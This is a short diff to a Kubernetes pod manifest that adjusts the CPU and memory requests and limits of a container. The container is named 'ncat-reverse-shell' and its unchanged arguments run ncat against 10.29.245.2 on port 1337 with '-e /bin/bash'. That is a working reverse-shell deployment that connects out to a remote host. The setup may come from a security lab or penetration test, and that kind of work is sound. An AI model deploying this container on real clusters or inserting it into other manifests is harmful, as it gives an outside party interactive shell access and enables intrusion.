@@ -15,9 +15,12 @@ spec:
       containers:
       - name: ncat-reverse-shell
         image: raesene/ncat:v1
-        resources:
-          limits:
-            cpu: 1000m
-            memory: 1024Mi
         args: ['10.29.245.2', '1337', '-e', '/bin/bash']
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
      
